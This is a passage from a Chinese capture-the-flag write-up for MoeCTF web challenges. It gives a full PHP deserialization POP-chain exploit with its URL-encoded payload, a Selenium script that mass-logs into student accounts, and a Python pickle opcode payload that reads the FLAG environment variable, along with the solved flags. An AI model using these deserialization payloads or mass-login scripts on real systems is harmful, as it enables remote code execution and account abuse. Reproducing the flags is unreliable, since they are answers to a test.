- 效果：将 class002 实例的 payload 属性设置为“dangerous”。

- class002：给此类实例的 a 属性赋 b 值时会向 b 属性方法传入 sec 值，同时该类有 dangerous 方法，会向传入变量的 evvval 方法传入 sec 值。但 sec 值难以改变（可以用反射）。
- 处理：用反射把 sec 改成下述 class003 对象
- 效果：前文设属性，此时会向 dangerous 方法传入 sec 值。即向 sec 的 evvval 方法传入 sec。而此时的 sec 是 class003 实例。

- class003：有 evvval 方法，传入参数会被 eval，同时 class003 对象作为字符串时是 mystr 变量。
- 处理：建 class003 对象，其 mystr 属性会被 eval。
- 效果：evvval 方法在上文被调用，传入的是 class003 对象，其会自动被转换成 mystr。

**序列化代码**

```php
<?php
class class000 {
    private $payl0ad = 0;
    protected $what;
}

class class001 {
    public $payl0ad;
    public $a;
}

class class002 {
    private $sec;
}

class class003 {
    public $mystr;
}

$c3 = new class003();
$c3Reflection = new ReflectionClass($c3);
$c3Property = $c3Reflection->getProperty('mystr');
$c3Property->setAccessible(true);
$c3Property->setValue($c3, 'print_r($_ENV);');

$c2 = new class002();
$c2Reflection = new ReflectionClass($c2);
$c2Property = $c2Reflection->getProperty('sec');
$c2Property->setAccessible(true);
$c2Property->setValue($c2, $c3);

$c1 = new class001();
$c1Reflection = new ReflectionClass($c1);
$c1Property1 = $c1Reflection->getProperty('a');
$c1Property2 = $c1Reflection->getProperty('payl0ad');
$c1Property1->setAccessible(true);
$c1Property2->setAccessible(true);
$c1Property1->setValue($c1, $c2);
$c1Property2->setValue($c1, "dangerous");

$c0 = new class000();
$c0Reflection = new ReflectionClass($c0);
$c0Property1 = $c0Reflection->getProperty('payl0ad');
$c0Property1->setAccessible(true);
$c0Property1->setValue($c0, 1);
$c0Property2 = $c0Reflection->getProperty('what');
$c0Property2->setAccessible(true);
$c0Property2->setValue($c0, $c1);

echo urlencode(serialize($c0));
?>
```

访问 http://127.0.0.1:12988/?data=O%3A8%3A%22class000%22%3A2%3A%7Bs%3A17%3A%22%00class000%00payl0ad%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00what%22%3BO%3A8%3A%22class001%22%3A2%3A%7Bs%3A7%3A%22payl0ad%22%3Bs%3A9%3A%22dangerous%22%3Bs%3A1%3A%22a%22%3BO%3A8%3A%22class002%22%3A1%3A%7Bs%3A13%3A%22%00class002%00sec%22%3BO%3A8%3A%22class003%22%3A1%3A%7Bs%3A5%3A%22mystr%22%3Bs%3A15%3A%22print_r%28%24_ENV%29%3B%22%3B%7D%7D%7D%7D 得到 flag：`moectf{1T_s3ems-tH4t-YOu-KNoW_WH4t-iS-pop_ln-phPPPpPPP!!!67}`。

改良：将 `class000` 的 what 属性改为 `phpinfo`，可以直接执行该命令获得环境变量。

#### 勇闯铜人阵

闯关弟子注意，本关考验你写爬虫脚本的功夫。

```python
import requests
from bs4 import BeautifulSoup

url = "http://127.0.0.1:13944"
data = {
    "player": "1",
    "direct": "弟子明白"
}

dict = {
    "1": "北方",
    "2": "东北方",
    "3": "东方",
    "4": "东南方",
    "5": "南方",
    "6": "西南方",
    "7": "西方",
    "8": "西北方"
}

session = requests.Session()
response = session.post(url, data=data)

print(response.text)

for i in range(5):   
    # 解析返回的HTML内容
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # 查找<h1 id="status">标签
    status_h1 = soup.find('h1', id='status')
    status_text = status_h1.get_text().strip()
    status_list = status_text.split(", ")
    if len(status_list) == 1:
        result = dict[status_text]
    else:
        result = f'{dict[status_list[0]]}一个，{dict[status_list[1]]}一个'
    data = {
    "player": "1",
    "direct": result
    }
    response = session.post(url, data=data)
    print(response.text)
```

执行得到 flag：`moectf{WelII1_yOU-p@5s_Th3_ChA1IenGe-frrRRRoM-TonrEn11}`。

#### Re: 从零开始的 XDU 教书生活

准备工作：本题我使用 [SingleFile](https://github.com/gildas-lormeau/SingleFile-MV3) 浏览器插件下载动态加载的网页，然后分析静态文件来获取所有的学生 ID，以免去繁杂的动态获取 ID。为了做到这个，首先要使用管理员账号登录签到界面之后在未签页面下滑直至加载完全，然后点击插件下载网页，放入脚本文件夹以便分析。

```python
# http://127.0.0.1:8888/login 为登录界面
# 从登录界面以学生身份登录之后进入二维码扫描所得网址即可完成签到
# 解析所有学生用户名直接分析 SingleFile 插件下载的静态文件

import threading
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time
from urllib.parse import unquote
import concurrent.futures

url = 'http://127.0.0.1:7100/login' # 替换为登录页的URL

def getUser():# 打开并读取本地HTML文件
    with open('RE0_School.html', 'r', encoding='utf-8') as file:
        html_content = file.read()

    # 解析HTML文件内容
    soup = BeautifulSoup(html_content, 'lxml')

    # 找到所有符合 <p class="name words"> 的元素
    p_tags = soup.find_all('p', class_='name words')

    # 提取每个标签的文本内容并保存到列表中
    content_list = [p.get_text() for p in p_tags]

    return content_list

def login(phone):
    opt = Options()
    opt.add_argument('--headless')
    opt.add_argument('--disable-gpu')
    browser = webdriver.Chrome(options=opt)

    browser.get(url=url)

    browser.find_element(by=By.ID, value="phone").send_keys(phone)
    browser.find_element(by=By.ID, value="pwd").send_keys(phone)
    browser.find_element(by=By.ID, value="loginBtn").click()
    time.sleep(1)
    browser.get(QRCodeURL)
    # browser.quit() # 不知道为啥这里注释掉比不注释效果好。

# 定义一个全局变量，用于保存src属性
QRCodeURL = None

# 定义一个线程函数，持续获取 src 属性
def fetch_src():
    global QRCodeURL
    driver = webdriver.Chrome()  # 初始化 WebDriver
    driver.get(url=url)

    driver.find_element(by=By.ID, value="phone").send_keys("10000")
    driver.find_element(by=By.ID, value="pwd").send_keys("10000")
    driver.find_element(by=By.ID, value="loginBtn").click()
    time.sleep(2)

    while True:
        # 定位元素并获取 src 属性
        img_element = driver.find_element(By.ID, "qrcode")
        QRCodeURL = img_element.get_attribute("src")[62:]
        QRCodeURL = unquote(QRCodeURL)
        
        # 每10秒获取一次新的 src 属性
        time.sleep(10)

# 启动线程来运行 fetch_src 函数
# 由于不打开网页时不刷新二维码，此处可以简化逻辑，不需要额外线程实时更新二维码链接
fetch_thread = threading.Thread(target=fetch_src)
fetch_thread.daemon = True  # 将其设置为守护线程，主线程退出时，子线程会自动退出
fetch_thread.start()
time.sleep(3)

# 主线程继续执行其他逻辑，不受fetch_src函数的阻塞

userList = getUser()

# 使用 ThreadPoolExecutor 创建 16 个线程
with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
    executor.map(login, userList)
```

执行一次脚本后会有一定的同学没签上，此时重新 SingleFile 下载页面并再次运行脚本即可。

完成后结束活动得到 flag：`moectf{u_aR3_4-g00D_T34ch3R_L0v3D_By_3v3RYOn3357dcb34}`

#### PetStore

分析源码得到其使用了 `pickle.loads()` 函数，而 pickle 反序列化**能执行任意代码**，是将 opcode 这种特殊代码逐行执行的过程。

使用 [pker.py](https://github.com/EddieIvan01/pker) 构造 opcode，来调用添加宠物的方法，并把 flag 作为宠物名字，以下是 pker.py 的输入。

```python
getattr = GLOBAL('__builtin__', 'getattr')
dict = GLOBAL('builtins', 'dict')
get = getattr(dict, 'get')
mod = GLOBAL('sys', 'modules')
os = get(mod, 'os')

store_module = GLOBAL('__main__', 'store')
create_pet = getattr(store_module, 'create_pet')

getenv = getattr(os, 'getenv')
flag_value = getenv("FLAG")
create_pet(flag_value, "test")
return
```

输出为 `b"c__builtin__\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS'get'\ntRp2\n0csys\nmodules\np3\n0g2\n(g3\nS'os'\ntRp4\n0c__main__\nstore\np5\n0g0\n(g5\nS'create_pet'\ntRp6\n0g0\n(g4\nS'getenv'\ntRp7\n0g7\n(S'FLAG'\ntRp8\n0g6\n(g8\nS'test'\ntR."`，base64 编码之后结果为 `Y19fYnVpbHRpbl9fCmdldGF0dHIKcDAKMGNidWlsdGlucwpkaWN0CnAxCjBnMAooZzEKUydnZXQnCnRScDIKMGNzeXMKbW9kdWxlcwpwMwowZzIKKGczClMnb3MnCnRScDQKMGNfX21haW5fXwpzdG9yZQpwNQowZzAKKGc1ClMnY3JlYXRlX3BldCcKdFJwNgowZzAKKGc0ClMnZ2V0ZW52Jwp0UnA3CjBnNwooUydGTEFHJwp0UnA4CjBnNgooZzgKUyd0ZXN0Jwp0Ui4=`。

将编码后的内容输入进 Import Pet，从宠物名字看见 Flag：`moectf{sT4RrYMEow'S_FIAg_H4s-B3En_@CcEPtED-@C@cAc4c3d}`。

改良：在 `__reduce__` 方法中返回一个 `exec` 函数来执行任意代码，这样做不需要构造 opcode。

### 写在最后

感谢本次的 MoeCTF，让我由一个脚本小子变成了更专业的脚本小子（笑）。虽然有过坐牢，但在解出题目的时候，坐的牢都有了意义。我也因此提高了自己使用一些工具的水平。也感谢看到这里的你。那么，下次见，Next phantasm...